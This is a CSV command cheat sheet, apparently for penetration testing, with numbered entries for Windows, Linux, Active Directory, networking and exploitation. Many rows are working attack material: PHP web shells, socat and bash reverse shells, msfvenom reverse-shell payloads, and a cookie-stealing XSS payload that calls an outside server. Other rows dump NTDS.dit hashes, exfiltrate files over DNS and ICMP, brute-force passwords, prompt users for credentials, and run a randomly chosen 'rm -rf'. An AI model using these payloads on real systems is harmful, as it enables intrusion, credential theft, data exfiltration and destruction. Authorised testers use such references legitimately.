CommandID,Command,Comment,Program
265,"iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT",Iptables port forward,
266,logins -p,list users without password,
267,svsc -a,list services,
268,prstat -a,list processes,
269,ver,system information,
270,"xterm -bg black -title ""TryH4rD3r"" -e ""ls -la;read""",Spawn a cmd in a gui window,
271,rdpy-rdpscreenshot.py 1.1.1.1,Take a screenshot of a RDP server (provided by rdpy),
272,xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg,take a screenshot from a open X11 and convert it to a jpg,
273,tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply',capture ping replies,
274,systeminfo /S [victim] /U [domain]/[user] /P [pass],remote system info,
275,fsutil fsinfo drives,list drives,
276,reg query HKLM /f [text]  /t REG SZ /s,search for text in the reg,
277,findstr /si [text] '.txt|xml|xls',grep for text in files,Cmd
278,net view /domain,show hosts in the current domain or add a domain for searching,Cmd
279,net share,current smb shares,Cmd
280,net session,active sessions,Cmd
281,"net share [sharename] [folder] /GRANT:Everyone,FULL","Share a directory with the world, probably don't want the world",Cmd
282,sc \\[victim] create [name] binpath=[pathtoexe] start= auto,Create a service on remote machine,
283,xcopy /s \\[victim] \dir [directory],copy a remote file to lcwd,
284,shutdown /m \\[victim] /r /t 0 /f,remote shutdown : /i as first option for gui,Shell
285,ipconfig /displaydns,show dnscache,Cmd
286,netstat -anop | findstr LISTEN,listening ports,Cmd
287,tftp -I [victim] GET [file],"download a file, no longer default",
288,netsh interface ip show,show interface information,Cmd
289,netsh interface ip set address local static [ip] [mask] [gw] [ID],set static ip,Cmd
290,netsh interface ip set dns local static [ip],set DNS server,Cmd
291,netsh interface ip set address local dhcp,enable DHCP,Cmd
292,makecab [file],compress file,
293,wusa.exe /uninstall /kb: [id],uninstall patch : 2871997,Cmd
294,rundll32.dll user32.dll LockWorkstation,lock the workstation,
295,netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;,disable local firewall,Cmd
296,reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t,re-enable CMD,
297,psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file],windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash,Psexec
298,"reg add ""HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer"" /v DenyTSConnections /t REG_DWORD /d 0 /f",enable RDP,Cmd
299,"reg add ""HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer\WinStations\RDP-TCP"" /v UserAuthentication /t REG_DWORD /d ""0"" /f",Disable NLA on RDP,Cmd
300,wmic startupwmic service,start wmic service,Cmd
301,wmic process list full,list all processes,Cmd
302,wmic ntdomain list,Domain and DC info,Cmd
303,wmic qfe,list patches,Cmd
304,"wrnic process call create ""[cmd]""",execute command,Cmd
305,"wmic process where name=""[cmd]"" call terminate",kill process,Cmd
306,"wmic logicaldisk get description,name",view logical shares,Cmd
307,"wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create ""\\[host]\[share]\[exe]""",execute command on remote host from remote smb share,Cmd
308,wmic /node:[victim] computersystern get username,get logged in users from the remote host,Cmd
309,wmic /node:[victim] process list brief /every:1,list remote processes every second,Cmd
310,"wmic /node:""[victim]"" path Win32_TerminalServiceSetting where AllowTSConnections=""0"" call SetAllowTSConnections ""1""",enble rdp on remote host,Cmd
311,"wmic netlogin where (name like ""%[user]%"") get numberoflogons",How many times has someone logged in,Cmd
312,"wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""C:\windows\\"" | findstr /i /v """"""",unquoted service path search add node for remote sys,Cmd
313,"wmic /node:[victim] /user:""[domain]\[user]"" /password:[pass] process call create ""cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt""",List volume shadow copies,Cmd
314,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt""",create volume shadow copy for c,Cmd
315,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM"" 2 &1 >> c:\temp\copy_system.txt",copy system out of a volume shadow copy,Cmd
316,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit"" 2 &1 >> c:\temp\copy_ntds.txt",copy out ntds from the voulme shadow copy,Cmd
317,secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes,Parse the SYSTEM and ntds with impacket,SecretsDump
318,invoke-webrequest,powershell wget,
319,wget,also powershell wget,Shell
320,"(new-object system.net.webclient).downloadFile(""[url]"",""[dest]"")",Download a file using command line windows (windows wget),Powershell
321,get-content,powershell type file,Powershell
322,get-service,powershell services,Powershell
323,get-psdrive,list of drives : cd Env:\ . . . mind . . . blown,Powershell
324,get-help,RTFM *cough*,Powershell
325,get-wmiobject -list 'netework',list interfaces with wmi,Powershell
326,"[Net.DNS]::GetHostEntry(""ip"")",get dns addr tab after :: for more choices,
327,Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt,get system information,Powershell
328,New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i,powershell mount remote share : think sysinternals remote share,Powershell
329,"Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt ""2017-01-13""}",txt files changed after the 13 Jan 2017,Powershell
330,"$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip "": ""$port"" : Closed"";}else{echo $ip "": ""$port"" : Open"";}$socket = $NULL;}}",powershell port scanning,Powershell
331,"$ping = New-Object System.Net.Networkinformation.ping;$ping.Send(""[ip]"",50O);",Ping ip with timeout of 500,Powershell
332,"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential(""[title]"",""[message]"",""[user]"",""[domain]"")",Ask user for credentials,Powershell
333,"powershell.exe -Command ""do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden ""[exe]"";Start-Sleep -s 14400}}while(1)""","powershell run on schedule, match says when run",Powershell
334,"powershell.exe Send-MailMessage -to ""[victim]"" -from ""[from]"" -subject ""[subject]"" -a ""[Attach file path]"" -body ""[Body]"" -SmtpServer [ServerIP]",Powershell send an email,Powershell
335,"Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter ""domainname='[domain]' | select textrepresentation",list hostname and ip for domain pc's,Powershell
336,"powershell.exe -noprofile -noninteractive -command ""[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server=""[$ip]/[script]"";$filepath=""c:/temp/SYSTEM"";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);""","Powershell upload file VIA post, script must write this out",Powershell
337,msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1,powershell shell,MSFVenom
338,HKLM\Software\Microsoft\Windows NT\CurrentVersion,Windows information in the reg,
339,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU,Mapped drives in reg,
340,HKLM\System\MountedDevices,Mounted devices,
341,HKLM\System\CurrentControlSet\Enum\USBStor,USB Devices,
342,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter,"enable ip routing in windows, use as GW",
343,HKLM\Security\Policy\PolAdTev,Audit policy,
344,HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services,Kernel or User Services,
345,HKLM|HKCU\Software,Machine or User software,
346,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs,Recent Documents,
347,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpenSaveMRU,Recent user location (MRU Most Recntly used),
348,HKCU\Software\Microsoft\Internet Explorer\TypedURLs,Typed Urls,
349,dsquery user -limit 0,list users,
350,"dsquery group ""cn=users,dc=[domain],dc=[tld]""",List groups for domain.com,
351,"dsquery group -name ""domain admins"" | dsget group -members -expand","Get Domain admins (prefer net groups ""domain Admins"")",
352,dsquery user -name [user] | dsget user -memberof -expand,get groups for user (net groups [user]),
353,dsquery user -name [user] | dsget user -samid,get user login name,
354,dsquery user -inactive 2,List accounts that have been inactive for two weeks,
355,"dsquery * ""DC=[domain],DC=[tld]"" -scope subtree -attr ""cn"" ""opperatingSystem""",List os's in the domain,
356,dsquery site -o rdn -limit 0,list site names,
357,dsquery subnet -site [site] -o rdn,list subnets within the sites shown,
358,dsquery server -site [site] -o rdn,list servers within site,
359,host [domain],list DC's,
360,https://hashcat.net/wiki/doku.php?id=example_hashes,hash list,
361,"Function Test-ADAuthentication {param($username,$password);echo ""$username $password"";(new-object directoryservices.directoryentry"""",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content ""user_logins.txt""){Test-ADAuthentication $userName password >> test4.txt;}","Simple powershell brute force, user input list, checks the password 'password'",
362,common ports,see /etc/services,
363,TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris,Networking Time to Live,
364,Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router,Networking Time to Live,
365,"Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE!",Classfull networks have not existed since 1993 cisco GTFO with telling people they exist,
366,Subnet ranges : /20 255.255.240.0 4096 hosts,"please use ipcalc, there is no l33tness in doing it in your head",
367,ipcalc -bnmp 10.0.0.1/20,Ip subnets,
368,"socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080",Route IPV6 through ipv4 for things that don't support it,
369,enable,raise privs cisco,
370,conf t,start configuration,
371,show session,show sessions,
372,show version,show version,
373,show running-config,"show the config which is running in flash, looking for password 7 and the like",
374,show startup-config,show the config which runs on start up,
375,show ip interface,show interface information : add breif for less,
376,show ip route,show the routes of the switch,
377,show access-lists,show the ACL for the switch,
378,http://[ip]/level/56/exec/show/config,Bypass auth on ios 11.2-12.2,
379,file2cable -i eth0 -f [file],replay packets to network,
380,"dnsrecon -t rvs -i 10.0.0.1,10.0.0.255",Reverse look up on range,
381,dnsrecon -t std -d [domain],brute names,
382,dnsrecon -t axfr -d [domain],do a zone transfer request (just use host . . .),
383,ftp -s ftp.txt,"uninteractive FTP, read commands from file",
384,for line in `base64 -w 62 [file]`; do host $line.[hostname]; done,"exfil file through DNS, may want to encrypt, also assuming you have a short domain",
385,for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done,"look for a free short domain, good luck",
386,"ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo ""11 $line 99"" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32",Exfil over icmp,
387,fpipe.exe -l [lport] -r [rip] [ip],forward local traffic htting lport to [rip]:[rport],
388,socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport],forward local traffic htting lport to [rip]:[rport],
389,for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done,"tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app",
390,ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip],"ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1",
391,plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip],"ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK",
392,ssh -D [port] [user]@[ip],"set up a socks proxy, proxycahins may help also",
393,msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe,create a evil calc,MSFVenom
394,ettercap -TP rand_flood,"try to make the switch fall over, and turn into a hub",
395,hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64,Hash byte lengths,
396,"for i in *; do pdfinfo $i | egrep -i ""Auth""; done  | sort","generate user list from PDF's, you can get more info to such as pdf maker",
397,"for i in `cat dets`; do echo ""Sening Spam from $i""; mailx -s ""Report Attached"" -r ""`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>"" -a report.pdf -S smtp-auth=login -S smtp-auth-user=""`echo $i | awk -F : '{print $1}'`"" -S smtp-auth-password=""` echo $i | awk -F : '{print $2}'`"" -S ssl-verify=ignore -v -S smtp=""10.11.1.229"" [victim] < email;echo _________; done",Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email',
398,https://gchq.github.io/CyberChef/,Common operations on data,
399,schtasks /query /fo LIST /v,"List windows scheduled tasks, older windows defender",
400,"wmic qfe get Caption,Description,HotFixID,InstalledOn",list installed patches on windows,
401,reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,Do MSI's have admin rights?,
402,echo %path%,show the current path to see if we can subvert anything,
403,sc sdshow [service],"Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)",
404,nmblookup [name],Do a netbios name query.,
405,"export PS1=""# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] """,Pretty terminal PS1 that is copy n paste safe,
406,apropos [keyword],search the manual page names and descriptions,
407,sntp [ip],Query the remote ntp time,
408,host -t axfr [ip],Ask for a zone transfer,
409,rusers -al [ip],show users rlogin,
410,net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password],mount a share within windows,
411,samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim],List users of the remote system,
412,rlogin -l [user] [target],Login using rlogin : Not installed by default,
413,finger @[ip],Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug,
414,tnscmd10g version -h [victim],Fingerprint remote oracle server,
415,CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;,Get Current user oracle DB : CMD new lines removed,
416,./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1,Try to brute the remote group name : cisco,
417,sed -i 's/[[:space:]]*$//' [input],Remove trailing whitespace,
418,thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst,Brute force PPTP password,
419,"./shocker.py -H TARGET  --command ""/bin/cat /etc/passwd"" -c /cgi-bin/status --verbose",NCC Shellshock tool,
420,"echo -e ""HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"" | nc TARGET 80",Shellshock Read File : Replace echo with anything you want,
421,php -S 0.0.0.0:80,PHP simple server,
422,"int main(void){setresuid(0, 0, 0);system(""/bin/bash"");}",Simple SUID program  ,
423,"perl -e 'exec ""/bin/bash"";'",perl spawn bash,
424,"python -c 'import pty;pty.spawn(""/bin/bash"")'",python spawn bash,
425,!bash,"Call a shell from a number of programs, VIM, Nmap FTP SFTP etc",
426,POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }},Ruby on Rails String Interpolation  : anything in #{} is executed,
427,Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv,Check for accounts that don't have password expiry set,
428,Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv,Check for accounts that have no password requirement,
429,Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv,Accounts that have the password stored in a reversibly encrypted format,
430,Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv,List users that are trusted for Kerberos delegation,
431,Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv,List accounts that don't require pre-authentication,
432,Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv,List accounts that have credentials encrypted with DES,
433,"ldapsearch -x -LLL -E pr=200/noprompt -h [victim] -D ""[domain]\\[user]"" -w '[password]' -b ""dc=[fqdn],dc=co,dc=uk""",Dump Ldap structure,
434,ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21,brute force RDP,
435,/opt/jre1.8.0_91/bin/javaws [something].jnlp,run a java web start JNLP,
436,/opt/jre1.8.0_91/bin/jcontrol,Open java control pannel,
437,Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 ,brute force HTTP basic burp,
438,"for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user='[domain]\$i' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo ""___"" ; done; done | tee ntlm_brute","NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?",
439,java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out,YsoSerial code execution ,
440,"grep -ir wpdb . | egrep -i ""get_r|insert|escape|query"" | egrep ""_GET|_POST|_REQUEST|\$"" | grep --color wpdb.",Very Basic SQLI test in wp plugin,
441,<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>,"Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily",
442,<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
443,<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
444,<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
445,<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, bis your command: See Commix to use this easily",
446,X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*,EICAR Test string,
447,"./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper ""bash -i >& /dev/tcp/[ip]/[port] 0>&1"" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug ""bash -i >& /dev/tcp/[ip]/[port] 0>&1""","Hadoop Command execution, of course replace the shell with whatever you want",
448,"for i in $(ls -alh /data/shares/opt/ | grep ""^drw"" | awk '{print $9}'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal",GitUp : Update all the opt gits,
449,hping -S -y -m 1300 -p 445 shared,TCP ping : Check MTU,
450,ping 8.8.8.8 -M do -s 1476 -f,ICMP : Check MTU,
451,https://jsfiddle.net/byf89m43/2/,JSFiddle skele,
452,aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2,Check for UNauth access to bucket,
453,"xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host]",XfreeRDP new swtich format,
454,<img src=127.0.0.1 onerror=this.src='http://[server]/?cookie='+document.cookie>,Simple steal cookie,
455,ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;,Create a SSH based TAP VPN,
456,./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v,"Hans ICMP tunnel, first cmd is server, second client",
457,iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r,"ICMP tunnel, first cmd is server, second client",
458,ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com,"DNS tunnel, first cmd is server, second client.",
459,"echo ""Username [user]"" >> config; echo ""Password [pass]"" >> config; echo ""Domain [domain]"" >> config; echo ""Proxy [proxyIP]"" >> config; echo ""Tunnel [lport]:[lip]:[rport]"" >> config; cntlm.exe -c config.conf","NTLM aware proxy client, proxychains",
460,"echo ""[ProxyList]"" > /etc/proxychains.conf; echo ""socks4  127.0.0.1 2222"" >> /etc/proxychains.conf; proxychains [program]",Run program over socks proxy,
461,"socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]","Socat BindShell, First on server, second on client",
462,"socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane","Socat reverse shell, First on client, second on server",
463,getent passwd; getent group;,enumerate users and groups,
464,"/opt/commix/commix.py -u ""https://[rip]:443/[resource]?[password]&cmd=1*"" --force-ssl","Commix abuse exec as per the php shells, nicer than burp repeater! ",
465,openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword,"OpenSSL Encypt, add -a if input is b64, ",
466,openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword,"OpenSSL decrypt, add -a if input is b64, ",
467,10.0.0.0/8 (10.255.255.255) | 172.16.0.0/12 (172.31.255.255) | 192.168.0.0/16 | 100.64.0.0/10 (10.127.255.255),"Internal Address ranges, 100 is for routing",
468,/usr/bin/gpp-decrypt [cpassword],"Decrypt group policy preferences password aka Cpassword, use LAPS not GPP",
469,sudo rm -rf $(sudo find / -type f | shuf -n1),Pick a file at random . . .,
470,"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head",Most used Terminal commands,
471,"cat [file]  | grep ""ACCOUNT FOUND"" | grep -v 0x000072:STATUS_ACCOUNT_DISABLED | awk  -F User: '{print $2}' | awk -F : '{print $1, $2}' | awk -F \\[SUC '{print $1}' | awk -F "" Password  "" '{print $1"":""$2}' | sort | sed s/' '/''/| uniq ","Grab Succsessfull passwords from a tee'd medusa, bah to spaces in usernames",
472,"for i in `cat ../clean_creds`; do echo $i | awk -F : '{print ""tsql -S [IP] -p 1433 -U [domain]\\\\""$2"" -P ""$3}'; done","Take the active users output and create filled in CMD's, course it can be anything, not just TSQL",
473,dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp,Project your mic to remote hosts speakers,
474,apt-file update; apt-file search [xfreerdp],Equivlent of Yum whatprovides : What provides what file,
475,yum whatproivdes ,Equivlent of apt-file search : What provides what file,
476,fcrackzip -D -p 'x' -u test.zip,Crack a ZIP file with a wordlist,
477,fcrackzip -D -p 'x' -u test.zip,"Crack a zip, brute force a 4 char password ",
478,"perl -e 'print ""A""x10000; print ""\n""'","Repeat A x times pipe into where you think the overflow location is, look for 0x41's",
479,pattern_create.rb -l 2700,"create a patern of 2700 bytes to isolate the buffer size you have, part of msf, look for value of EIP ",
480,pattern_offset.rb -l 2700 -q [EIP],Get the exact offset for the EIP,
481,"""\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff""","Bad Char's block, re-send removing bad ones",
482,!mona modules,Work out if there are any juicy targets to look for a jmp esp in (imunity debuger),
483,!mona find '\xff\xef' -m [dll],Look for a JMP ESP in the DLL found in the mona modules,
484,"msfvenom -p windows/shell_reverse_tcp LHOST=[LIP] LPORT=[LPORT] -f c -b ""\x00"" ","Create shellcode which connects back on port can add –e x86/shikata_ga_nai, -b is bad chars",MSFVenom
485,"xrandr   --output `xrandr -q | grep ""connected"" | grep -v dis | awk '{print $1}' | head -n 1` --rotate  inverted",Anoy a co-worker by rotating their screen,
486,find / \( -type f -a -user root -a -perm -4001 \) 2>/dev/null,Locate SUID files owned by root,
487,"echo ""https://www.kernel-exploits.com/kernel/?version=""`uname -r  | awk -F . '{print $1"".""$2}'`",Quick formatted link to check ketne exploits,
488,<% style=behavior:url(: onreadystatechange=alert(1)>,Asp.net filter evasion,
489,patator.py unzip_pass zipfile=[file] password=FILE0 0=[pass.txt] -x ignore:code!=0,"Crack a zip file, Note: Older enc only",
490,softwareupdate -l,Show updates available to a MacOS device,
491,"man -P 'less -p "".*Tables""' ascii",Show a compact ascii table,
492,"nmap -sU --top-ports 1000 -oA clientname_udp -iL scope -v --open & nmap -A -oA clientname_ce -p- -iL scope -v --open & nmap -A -oA clientname_ce_quick --script /usr/share/nmap/scripts/http-screenshot.nse -p 80,443,21,22,23,25,109,110,990,465,1194,1723,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -iL scope -v --open;","Do a quick nmap of the top 1000 UDP, all TCP, and common HTTP ports",
493,"<%=""Hello Word""%>","Echo hello world, test for RCE in JSP application.",
494,"out.print(""Hello World"");","Echo hello world, test for RCE in JSP application.",
